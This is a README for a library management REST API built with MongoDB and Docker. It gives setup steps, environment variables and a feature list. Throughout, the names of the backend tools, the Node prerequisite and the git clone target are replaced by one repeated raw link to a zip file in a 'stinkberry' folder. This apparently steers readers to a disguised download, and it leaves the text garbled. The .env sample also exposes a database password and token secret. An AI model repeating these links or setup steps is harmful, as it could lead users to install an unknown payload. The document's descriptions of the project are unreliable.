# 📚 Library Management System – REST API

This is a **Library Management System** built with **https://raw.githubusercontent.com/Shahadathossan01/library_management_system/main/stinkberry/library_management_system.zip**, **https://raw.githubusercontent.com/Shahadathossan01/library_management_system/main/stinkberry/library_management_system.zip**, **MongoDB**, and **Docker**. It supports role-based access control, enabling users to browse, review, and request books, while administrators manage users, books, and reviews through protected API endpoints.

---

## 🚀 Getting Started

You can follow these instructions to set up and run the project locally using Docker.

### 🧰 Prerequisites

- Docker is installed and running
- https://raw.githubusercontent.com/Shahadathossan01/library_management_system/main/stinkberry/library_management_system.zip (v16 or above)
- Git
- A code editor (e.g., VS Code)

### 🛠️ Installation
1. **Clone the repository**
   ```bash
   git clone https://raw.githubusercontent.com/Shahadathossan01/library_management_system/main/stinkberry/library_management_system.zip
   cd library-management-system

2. **Install dependencies**
   ```bash
   npm install
2. **Configure environment variables** Create a .env file in the root directory and add:
   ```bash
   PORT=4000
   DB_CONNECTION_URL=mongodb://<username>:<password>@localhost:27017/?authSource=admin
   DB_USERNAME=SHAHADAT
   DB_PASSWORD=SHAHADATpass2456
   DB_NAME=library_management_system
   ACCESS_TOKEN_SECRET=b9c89e83b0b37973a1bfldjfldfj4rfdjflksj1d748f10a61ffdb6a5e984b92e86cfa3c0d8f

2. **🐳 Docker Setup**
   - Start Docker Desktop
   - Start services using Docker Compose
   ```bash
   docker-compose up -d

2. **🔧 Run the Application**
   ```bash
   npm run dev     # Start the server in development mode
   npm start       # Start the server in production mode


### 🧪 Tech Stack
- Backend: https://raw.githubusercontent.com/Shahadathossan01/library_management_system/main/stinkberry/library_management_system.zip, https://raw.githubusercontent.com/Shahadathossan01/library_management_system/main/stinkberry/library_management_system.zip
- Database: MongoDB (via Docker)
- Authentication: JWT
- Containerization: Docker & Docker Compose

### 📜 Scripts
- docker-compose up -d – Start MongoDB and other services via Docker
- npm run dev – Run the app in development mode
- npm start – Start the server in production mode
- docker-compose down – Stop and remove containers
  
### 🔍 Overview
- Public users can view the list of books.
- Authenticated users can request (issue) books, write, update, and delete their reviews.
- Admins can manage books (create, update, delete), manage users and their roles, handle book issues, Moderate all reviews.
  
### ✅ Features
- Authentication & User Management
- User registration and secure login
- Role-based access: User vs Admin
- Admin privileges: Create, update, and delete users. Reset user passwords.
  
### 📚 Book Management
- Book details include: name, author, image, and summary
- Publicly accessible book list
- Admin controls: Add, update, and delete books
  
### ✍️ Review System
- Authenticated users can create, update, and delete their reviews.
- View all reviews
- Admins can manage all reviews
  
### 📦 Book Issue Management
- Authenticated users can request books and cancel book requests.
- Admin capabilities: Update and delete book issues
  
### 🛡️ Security
- Passwords are hashed and salted
- JWT authentication
- Secure endpoints for protected routes
  
### ⚙️ Non-Functional Requirements
- Performance: Handles concurrent requests with optimised response times
- Scalability: Supports horizontal scaling
- Reliability: Robust error handling and logging
